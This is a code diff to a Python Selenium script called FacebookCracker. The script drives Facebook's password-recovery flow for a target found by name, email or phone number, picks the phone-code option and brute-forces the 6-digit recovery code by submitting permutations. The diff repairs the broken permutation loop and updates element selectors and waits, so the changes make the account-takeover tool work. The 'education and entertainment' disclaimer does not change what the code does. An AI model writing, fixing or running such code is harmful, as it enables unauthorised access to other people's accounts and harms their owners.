@@ -1,3 +1,4 @@
+
 """
     NOTICE: This program was made solely for education and entertainment
     purposes, the developer is not responsible for any illegal or unauthorized
@@ -14,7 +15,7 @@ from bs4 import BeautifulSoup
 
 class FacebookCracker(object):
   def __init__(self):
-    self.InitFacebook('Enter full name of person')
+    self.InitFacebook('Email or Full Name, or phone number')
 
   def InitFacebook(self, fname):
     #setting up an index for later
@@ -30,17 +31,18 @@ class FacebookCracker(object):
     #presses enter
     inputElement.send_keys(Keys.ENTER)
     #Clicks button to select person--Unless specified otherwise, will select first person
-    btnElement = driver.find_element_by_class_name("uiButton")
+    btnElement = driver.find_element_by_css_selector("a.uiButton")
     btnElement.click
     WebDriverWait(driver, 7)
     #Selects radio element for phone--if phone is not
     #connected it will select email and this will not work
     radElement = driver.find_element_by_id("u_0_1")
     radElement.click
-    WebDriverWait(driver, 10)
+    WebDriverWait(driver, 7)
     #Presses enter on the "a"
     btnElement2 = driver.find_element_by_id("u_0_2")
     btnElement2.click
+    WebDriverWait(driver, 9)
     #Finds the input element
     inputElement2 = driver.find_element_by_class_name("inputtext")
     #List that holds starter lists to find permutations for
@@ -49,12 +51,11 @@ class FacebookCracker(object):
     #Runs every possible permutation from list above, creating every possible
     #6 digit combination
     for i in numberPerms:
-        for p in numberPerms[e]:
-            theStr = ''.join(map(str, p))
+        for b in itertools.permutations(i):
+            theStr = ''.join(map(str, b))
             inputElement3 = driver.find_element_by_class_name("inputtext")
             inputElement3.send_keys(theStr)
             inputElement3.send_keys(Keys.ENTER)
-        e=e+1
 #Initializing class
 if __name__ == '__main__':
     fbook = FacebookCracker()
